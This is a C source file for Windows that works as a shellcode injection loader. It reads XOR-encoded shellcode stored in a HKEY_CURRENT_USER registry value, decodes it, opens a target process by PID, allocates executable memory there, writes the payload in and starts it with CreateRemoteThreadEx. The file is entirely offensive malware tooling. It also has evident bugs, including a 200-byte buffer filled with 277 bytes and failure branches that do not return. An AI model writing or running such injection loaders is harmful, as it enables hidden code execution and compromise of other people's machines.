#include<stdio.h>
#include<windows.h>
#include<winreg.h>
#include"func.h"

HKEY hkey;
LSTATUS Lstatus;
DWORD dataSize = 277;
unsigned char  shellcode[200];
DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID pBuffer = NULL;

void decrypt(unsigned char shell[],int shell_length) {
	unsigned char key = 46;

	printf("\n\nDecrypted Shellcode (XOR with key 46):\n");
	for (int i = 0; i < shell_length; i++) {
		shell[i] ^= key; // XOR encryption
		printf("\\x%02x", shell[i]);
		if (i % 12 == 0 & i != 0) {
			printf("\n");
		}
	}
}
unsigned char* Reader(){

	
	Lstatus = RegOpenKeyExA(HKEY_CURRENT_USER, REG, 0, KEY_READ, &hkey);


	printf("%ld", Lstatus);
	if (Lstatus != ERROR_SUCCESS) {

		printf("[-]  error on openign handle to hkey \n");
		return NULL;

	}

	Lstatus = RegQueryValueExA(hkey, SUBREG, NULL, NULL, shellcode, &dataSize);

	if (Lstatus != ERROR_SUCCESS) {
		
		printf("[-]  error on openign reading the value \n ");
		return NULL;

	}

	printf("[+] // DONE \n");
	printf("\n");
	printf("[+] // We read this : \n");
	printf("\n");

	int length = dataSize - 1;  // Subtract 1 to ignore the null terminator

	// Loop through the array and print each byte in hexadecimal format
	for (int i = 0; i < length; i++) {
		printf("\\x%02x", shellcode[i]);
		if (i % 12 == 0 & i != 0) {
			printf("\n");
		}
	}

	printf("\n");
	printf("\n");

	//if (dataSize > sizeof(shellcode)) {
		//printf("Error: data size exceeds buffer size.\n");
		//return NULL;
	//}


	return shellcode;

}

int main(int argc, char* argv[]) {


	int length = dataSize - 1;

	if (argc < 2) {
		printf("[-] error , usage : programe.exe <PID> ");
		return EXIT_FAILURE;

	}

	printf("   _____       _      _            \n");
	printf("  / ____|     | |    (_)           \n");
	printf(" | (___   __ _| |     _ _ __ ___   \n");
	printf("  \\___ \\ / _` | |    | | '_ ` _ \\  \n");
	printf("  ____) | (_| | |____| | | | | | | \n");
	printf(" |_____/ \\__,_|______|_|_| |_| |_| \n");
	printf("                                   \n");
	printf("                                   \n");

	printf("   _   _   _   _   _   _   _   _   _   _   _   \n");
	printf("  / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\  \n");
	printf(" ( R | E | G | - | R | E | A | D | E | R )\n");
	printf("  \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/  \n");
	printf("\n");
	printf("\n");



	
	PID = atoi(argv[1]);
	TID = atoi(argv[2]);
	printf("[+] we traying open process with pid : %ld \n", PID);

	/* open handle to process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, PID);

	if (hProcess == NULL) {
		printf("[-] we can't open the handle to the process with pid : %ld error :%ld", PID, GetLastError());
		EXIT_FAILURE;
	}
	printf("[+] we got a handle : \\--0x%p for process : %ld \n", hProcess, PID);

	/* Create memory and alloce bytes */
	pBuffer = VirtualAllocEx(hProcess, NULL, length, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	printf("[+] we reserved memory for the handle : \\--0x%p  with PAGE_EXECUTE_READWRITE Permisions \n", hProcess);
	/* write the allocated memory into the process memory */

	unsigned char* shellcode = Reader();



	for (int i = 0; i < length; i++) {
		printf("\\x%02x", shellcode[i]);
		if (i % 12 == 0 & i != 0) {
			printf("\n");
		}
	}

	decrypt(shellcode, length);
	if (!WriteProcessMemory(hProcess, pBuffer, shellcode, length, NULL)) {
		printf("[-] we can write into processMemory error : %ld", GetLastError());
		EXIT_FAILURE;
	}

	/*Create a thread to run the payload */
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pBuffer, NULL, 0, 0, &TID);

	if (hThread == NULL) {
		printf("[-] failed to create handle to the thread , error : %ld ", GetLastError());
	    return EXIT_FAILURE;
	}
	printf("[+] we got a handle : \\--0x%p for thread : %ld \n", hThread, TID);


	/*Threat waiting*/
	printf("[+] Waiting for thread for finishing\n");
	WaitForSingleObject(hThread, INFINITE);
	printf("[+] Threat Finish Excution \n");

	/*Cleaning up */
	printf("[+] Cleaning-up the handles \n");
	//CloseHandle(hProcess);
	//CloseHandle(hThread);
	printf("[+] We are finished \n");
	return EXIT_SUCCESS;

	

	
}